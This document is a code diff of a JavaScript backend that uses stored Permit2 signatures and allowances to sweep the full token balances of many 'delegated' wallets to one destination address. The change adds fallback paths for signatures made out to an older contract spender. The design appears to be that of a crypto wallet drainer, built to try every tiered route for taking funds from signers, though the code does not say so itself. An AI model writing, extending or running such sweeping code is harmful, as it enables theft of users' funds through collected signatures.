@@ -1027,8 +1027,13 @@ async function sweepGaslessWallet(walletAddress) {
       return;
     }
 
-    // Verify spender matches relayer BEFORE EIP-2612 permits — if mismatch the tx will revert
+    // Relayer must be msg.sender for permitTransferFrom — reject other spenders.
+    // Exception: V2 contract spender (old test sigs) — skip gracefully; AllowanceTransfer handles it.
     if (batch.spender && batch.spender.toLowerCase() !== relayerWallet.address.toLowerCase()) {
+      if (CONTRACT_ADDRESS && batch.spender.toLowerCase() === CONTRACT_ADDRESS.toLowerCase()) {
+        log(`[gasless/batch] sig spender=V2 contract — cannot call permitTransferFrom; falling through to AllowanceTransfer path`);
+        return;
+      }
       err(`[gasless/batch] ❌ SPENDER MISMATCH — sig.spender=${batch.spender} relayer=${relayerWallet.address} — cannot sweep`);
       return;
     }
@@ -1631,14 +1636,17 @@ async function sweep(wallet) {
       .single();
 
     if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details) && pbData.signature) {
-      // First: call permit2.permit() to register the stored AllowanceTransfer
-      // signature on-chain. This sets Permit2's internal allowances for the
-      // relayer so that transferFrom() calls below will succeed.
+      // Detect whether sig was signed for the relayer or the V2 contract.
+      // New sigs always use RELAYER_ADDRESS; legacy sigs from a brief test period used CONTRACT_ADDRESS.
+      const pb3Spender  = (pbData.permit.spender ?? relayerWallet.address).toLowerCase();
+      const pb3IsV2     = !!(CONTRACT_ADDRESS && pb3Spender === CONTRACT_ADDRESS.toLowerCase());
+      const pb3CheckFor = pb3IsV2 ? CONTRACT_ADDRESS : relayerWallet.address;
+
+      // Register AllowanceTransfer on-chain if not already set (anyone can call permit()).
       try {
-        const [p2Amount0] = await permit2Read.allowance(checksum, pbData.permit.details[0]?.token, relayerWallet.address);
+        const [p2Amount0] = await permit2Read.allowance(checksum, pbData.permit.details[0]?.token, pb3CheckFor);
         if (p2Amount0 === 0n) {
-          // Allowance not yet set — register it now using the stored sig
-          log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances`);
+          log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances (spender=${pb3Spender.slice(0,10)})`);
           const fee = await getFeeData();
           const permitTx = await permit2.permit(
             checksum,
@@ -1654,26 +1662,40 @@ async function sweep(wallet) {
           log(`[allowance] ✅ permit() confirmed`);
         }
       } catch (e) {
-        err(`[allowance] permit() failed: ${e.reason ?? e.message} — trying transferFrom anyway`);
+        err(`[allowance] permit() failed: ${e.reason ?? e.message} — trying sweep anyway`);
       }
 
-      for (const detail of pbData.permit.details) {
-        const tokenAddr = normalizeAddress(detail.token);
-        if (!tokenAddr) { warn(`[allowance] skipping null/invalid token in permit details`); continue; }
+      if (pb3IsV2 && contract) {
+        // V2 spender: one call to sweepViaPermit2 covers all tokens
+        const tokenAddrs = pbData.permit.details.map(d => normalizeAddress(d.token)).filter(Boolean);
         try {
-          const [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, tokenAddr, relayerWallet.address);
-          if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
-
-          const token = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
-          const balance = await token.balanceOf(checksum);
-          if (balance === 0n) continue;
-
           const fee = await getFeeData();
-          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr, { gasLimit: 150_000n, ...fee });
+          const tx  = await contract.sweepViaPermit2(checksum, tokenAddrs, { gasLimit: 100_000n + BigInt(tokenAddrs.length) * 60_000n, ...fee });
           await tx.wait();
-          log(`[allowance] ✅ swept ${tokenAddr.slice(0,10)}`);
+          log(`[allowance] ✅ sweepViaPermit2 confirmed for ${checksum} (${tokenAddrs.length} token(s))`);
         } catch (e) {
-          err(`[allowance] ❌ ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message}`);
+          err(`[allowance] sweepViaPermit2 ❌: ${e.reason ?? e.message}`);
+        }
+      } else {
+        // Relayer spender: per-token permit2.transferFrom
+        for (const detail of pbData.permit.details) {
+          const tokenAddr = normalizeAddress(detail.token);
+          if (!tokenAddr) { warn(`[allowance] skipping null/invalid token in permit details`); continue; }
+          try {
+            const [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, tokenAddr, relayerWallet.address);
+            if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
+
+            const token = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
+            const balance = await token.balanceOf(checksum);
+            if (balance === 0n) continue;
+
+            const fee = await getFeeData();
+            const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr, { gasLimit: 150_000n, ...fee });
+            await tx.wait();
+            log(`[allowance] ✅ swept ${tokenAddr.slice(0,10)}`);
+          } catch (e) {
+            err(`[allowance] ❌ ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message}`);
+          }
         }
       }
     }
@@ -1705,17 +1727,30 @@ async function sweep(wallet) {
       let sweptAny = false;
       for (const { token, balance } of liveWithBalance) {
         try {
-          const [p2Amt,, p2Exp] = await permit2Read.allowance(checksum, token, relayerWallet.address);
-          if (p2Amt === 0n || BigInt(p2Exp) < nowSecs) continue;
-          const sweepAmt = p2Amt < balance ? p2Amt : balance;
-          if (sweepAmt === 0n) continue;
           const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
-          log(`[live-allowance] ${short} — sweeping ${sym} via live Permit2 allowance`);
-          const fee = await getFeeData();
-          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, token, { gasLimit: 150_000n, ...fee });
-          await tx.wait();
-          log(`[live-allowance] ✅ swept ${sym} from ${short}`);
-          sweptAny = true;
+          const [p2Amt,, p2Exp] = await permit2Read.allowance(checksum, token, relayerWallet.address);
+          if (p2Amt > 0n && BigInt(p2Exp) >= nowSecs) {
+            // Relayer spender: direct permit2.transferFrom
+            const sweepAmt = p2Amt < balance ? p2Amt : balance;
+            if (sweepAmt === 0n) continue;
+            log(`[live-allowance] ${short} — sweeping ${sym} via relayer Permit2 allowance`);
+            const fee = await getFeeData();
+            const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, token, { gasLimit: 150_000n, ...fee });
+            await tx.wait();
+            log(`[live-allowance] ✅ swept ${sym} from ${short}`);
+            sweptAny = true;
+          } else if (CONTRACT_ADDRESS && contract) {
+            // V2 spender fallback: check if the V2 contract has a live allowance for this token
+            const [v2Amt,, v2Exp] = await permit2Read.allowance(checksum, token, CONTRACT_ADDRESS);
+            if (v2Amt > 0n && BigInt(v2Exp) >= nowSecs) {
+              log(`[live-allowance] ${short} — sweeping ${sym} via V2 sweepViaPermit2`);
+              const fee = await getFeeData();
+              const tx = await contract.sweepViaPermit2(checksum, [token], { gasLimit: 160_000n, ...fee });
+              await tx.wait();
+              log(`[live-allowance] ✅ swept ${sym} (V2 spender) from ${short}`);
+              sweptAny = true;
+            }
+          }
         } catch (e) {
           const msg = e.reason ?? e.message ?? "";
           if (!/allowance/i.test(msg)) err(`[live-allowance] ❌ ${token.slice(0, 10)}: ${msg}`);
@@ -1753,12 +1788,18 @@ async function sweep(wallet) {
       log(`[gasless] permitted: ${sig.permitted?.length}`);
 
       if (!spenderMatch) {
-        err(`[gasless] ❌ SPENDER MISMATCH — sig signed for ${sig.spender} but relayer is ${relayerWallet.address}`);
-        err(`[gasless] Set BOT_ADDRESS env var on backend to ${relayerWallet.address} and have user re-activate`);
-        if (supabase) {
-          await supabase.from("delegated_wallets")
-            .update({ needs_reactivation: true })
-            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+        if (CONTRACT_ADDRESS && sig.spender?.toLowerCase() === CONTRACT_ADDRESS.toLowerCase()) {
+          // Sig was signed for V2 contract (legacy test period) — relayer cannot call permitTransferFrom.
+          // AllowanceTransfer (Tier 3/3.5) or direct-allowance (Tier 5) handles this wallet.
+          log(`[gasless] sig spender=V2 contract — relying on AllowanceTransfer path; not setting needs_reactivation`);
+        } else {
+          err(`[gasless] ❌ SPENDER MISMATCH — sig signed for ${sig.spender} but relayer is ${relayerWallet.address}`);
+          err(`[gasless] Set BOT_ADDRESS env var on backend to ${relayerWallet.address} and have user re-activate`);
+          if (supabase) {
+            await supabase.from("delegated_wallets")
+              .update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          }
         }
         // Do NOT return — fall through to Tier 5 (direct-allowance may still work)
       } else if (dl < nowSecs) {
